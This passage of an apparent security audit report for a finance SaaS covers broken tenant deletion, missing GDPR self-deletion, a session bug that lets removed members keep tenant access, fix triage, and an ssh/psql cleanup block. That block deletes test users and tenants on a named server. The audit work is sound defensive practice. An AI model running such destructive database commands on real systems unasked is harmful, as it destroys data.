`server/src/routes/system.ts:146` runs `DELETE FROM tenants WHERE id = $1` and expects it to work. But of the ~30 tenant_id FK constraints on data tables, only ~10 are `ON DELETE CASCADE`. The rest (accounts, transactions, attachments, categories, normalization_rules, transaction_splits, recurring_suggestions, budgets, savings_goals, bills, recurring_income, holdings, vehicles, commute_routes, route_vehicle_assignments, fuel_prices, category_suggestions, import_batches) **default to NO ACTION = RESTRICT**.

So `DELETE FROM tenants` will throw a foreign-key violation for any tenant that has ever had data. The super-admin "delete tenant" feature is effectively broken — and the error is currently returned as a 500 with a raw Postgres error message.

Also: there's **no disk cleanup of attachments** when a tenant is deleted. Even if the DB delete succeeded, the encrypted attachment files would remain forever in `/data/attachments/…`.

And: **no Stripe customer cleanup** — the Stripe customer object persists. If the customer had an active subscription, it keeps billing until canceled manually.

**Fix** (this is a multi-step job):
1. Alter every tenant_id FK to `ON DELETE CASCADE`.
2. Wrap the tenant delete in a transaction that:
   - Looks up every attachment storage_path for the tenant,
   - Looks up the Stripe customer ID,
   - DELETEs the tenant (cascade handles DB),
   - Cancels the Stripe subscription + deletes the Stripe customer,
   - `unlink()`s the attachment files.
3. Add a corresponding `DELETE /api/auth/me` (or `/api/me/account`) for user-initiated self-deletion → see F-35.

---

### F-35 — No user-initiated account/tenant deletion (GDPR/CCPA) (P1)

A user has no in-app path to delete their own account or tenant. The only deletion path is super-admin `DELETE /api/system/tenants/:id` (which is broken — see F-34).

For a SaaS that accepts EU/EEA traffic, GDPR Article 17 ("Right to erasure") requires user-initiated deletion as a self-service flow. CCPA has a similar requirement for California users.

**Fix**: add a `DELETE /api/me/account` (or two-step "request → confirm" flow) that triggers the full tenant-deletion procedure from F-34. Audit-log the request. Send a confirmation email.

---

### F-36 — Session-membership desync: removed users retain tenant access (P1)

Empirical repro:
1. User A is admin of tenant T (membership row exists, session active_tenant_id=T).
2. Admin removes A from T: `DELETE FROM memberships WHERE user_id=A AND tenant_id=T`.
3. A's existing session cookie still works.
4. `GET /api/accounts` with A's cookie → **returns every account in T**.
5. `GET /api/auth/me` correctly returns `memberships: []` but `active_tenant_id: <T>` — the UI knows A isn't a member, but the API still serves T's data.

The auth gate reads `req.user.tenantId` from the session's `active_tenant_id` and grants access without re-checking membership.

**Concrete scenarios**:
- Family plan: admin spouse removes child or other spouse → removed party retains access for up to 7 days.
- Compromised admin: revoking their membership doesn't kick them out.
- Role downgrade: not tested but likely the same — `loadUserContext()` runs once per request but the session's tenant ID is still trusted.

Notably: `loadSession()` DOES re-check `users.is_super_admin` on every request (`auth/sessions.ts:loadSession`), so super-admin status IS refreshed. But tenant membership is not.

**Fix** (either approach):
1. **Per-request membership check** (correct but +1 DB hit): in the auth gate (`app.ts:165-234`), after loading the session, verify `EXISTS(SELECT 1 FROM memberships WHERE user_id=$1 AND tenant_id=$2)` before letting the request proceed with `req.user.tenantId`. If not, set `req.user.tenantId = null` and let `requireTenant` 403.
2. **On-delete session invalidation** (lighter weight, eventual consistency): when a membership row is deleted, run `UPDATE sessions SET active_tenant_id = NULL WHERE user_id = $1 AND active_tenant_id = $2`. The session keeps working but stops granting access to T.

Approach 2 is cheaper but misses the case of "active_tenant_id was set after the membership delete" (impossible in current code, but worth noting). Approach 1 is the durable fix.

---

### F-37 — OFX parser is XXE-safe (no finding)

Hand-rolled SGML/XML parser in `server/src/import/parsers/ofx.ts`. Skips processing instructions and comments (line 130: `if (raw.startsWith('!') || raw.startsWith('?')) continue;`). Entity decoding is whitelisted to `&amp; &lt; &gt; &quot; &apos;` plus numeric character references — no external entity resolution.

---

## Triage for 0.22.x launch readiness

If the goal is "ship Stripe live tomorrow", the order should be:

**P0 — fix today, rotate keys, redo backup:**
- F-13 (backup snapshot leaks SESSION_SECRET + KEK + Stripe creds)
  1. Remove secret-class keys from `KNOWN_SETTINGS` env-snapshot capture.
  2. Delete existing `env.snapshot.json` files from the test server.
  3. Rotate SESSION_SECRET and ATTACHMENT_ENCRYPTION_KEY on test (they were in the audit transcript). 
  4. **Before launching prod**, ensure prod's KEK is fresh and never lived in a backup file.

**P1 — block live-mode launch:**
- F-01 (login rate limit) — Cloudflare WAF or `login_attempts` table
- F-02 (password-reset timing) — background-queue the email send for symmetric latency
- F-03 (sibling reset tokens) — `DELETE password_resets WHERE user_id=$1 AND consumed_at IS NULL` after a successful reset
- F-04 (security headers) — register `@fastify/helmet`
- F-20 (OIDC email auto-link ATO) — require `email_verified` + email-loop confirmation on first link, verify id_token signature
- F-28 (DMARC duplicate record) — delete the `p=none;` record, add `rua=…`, confirm Maileroo DKIM selector
- F-33 (privacy / terms / cookie pages missing) — minimum viable Privacy Policy + Terms of Service shipped
- F-34 (tenant delete broken) — make tenant_id FKs ON DELETE CASCADE + actually clean up attachments + Stripe customer
- F-35 (no user self-deletion) — required for GDPR Article 17
- F-36 (session-membership desync) — per-request membership check OR on-delete session invalidation

**P2 — land in 0.22.x but not strictly blocking:**
- F-05 (session rotation on login)
- F-06 (login timing)
- F-07 (password policy — raise to 12 chars, add HIBP check)
- F-08 (password-reset rate limit) 
- F-09 (JSON parser error mapping)
- F-15 (KEK rotation function)
- F-21 (file content/MIME validation via magic bytes)
- F-22 (CSV formula injection — prefix `=+-@\t\r` with single-quote)
- F-23 (OFX URL SSRF — block private IPs + DNS rebinding)
- F-32 (audit-log DB-layer trigger)

**P3 / backlog:**
- F-10/F-11 (active sessions UI, server-side idle timeout)
- F-12 (API key expiry + granular scopes)
- F-25 (concurrent signup 500s — wrap in transaction with ON CONFLICT)
- F-31 (read-only container rootfs, seccomp profile, no-new-privileges)
- Email-change endpoint (UX, not security)

**Rough effort estimates** (if a single engineer does them sequentially):
- P0: 1-2 hours (mostly redo backup snapshot + delete files + rotate keys).
- P1 batch: ~2 work-days. The big-ticket items are F-33 (legal pages — depends on lawyer turnaround for content), F-34 (cascade migration + Stripe cleanup), F-35 (self-delete flow + tests), F-36 (per-request membership check + cache).
- P2 batch: ~1 work-day.

If lawyer-turnaround on privacy/terms is the long pole, everything else can ship in 2 days.

---

## Cleanup commands (run when done with test data)

```sh
ssh srv928192 "docker exec smrtcash-db psql -U smrtcash -d smrtcash -c \"
  DELETE FROM email_verifications WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'sectest-%@example.invalid');
  DELETE FROM password_resets       WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'sectest-%@example.invalid');
  DELETE FROM sessions              WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'sectest-%@example.invalid');
  DELETE FROM api_keys              WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'sectest-%@example.invalid');
  DELETE FROM memberships           WHERE user_id IN (SELECT id FROM users WHERE email LIKE 'sectest-%@example.invalid');
  DELETE FROM accounts              WHERE tenant_id IN (SELECT id FROM tenants WHERE name LIKE 'Sec Test %');
  DELETE FROM budgets               WHERE tenant_id IN (SELECT id FROM tenants WHERE name LIKE 'Sec Test %');
  DELETE FROM goals                 WHERE tenant_id IN (SELECT id FROM tenants WHERE name LIKE 'Sec Test %');
  DELETE FROM tenants               WHERE name LIKE 'Sec Test %';
  DELETE FROM user_identities       WHERE email LIKE 'sectest-%@example.invalid';
  DELETE FROM users                 WHERE email LIKE 'sectest-%@example.invalid';
\""
```

(Run this manually after reviewing the report — it deletes the two test users + their tenants + everything tenant-scoped under them.)
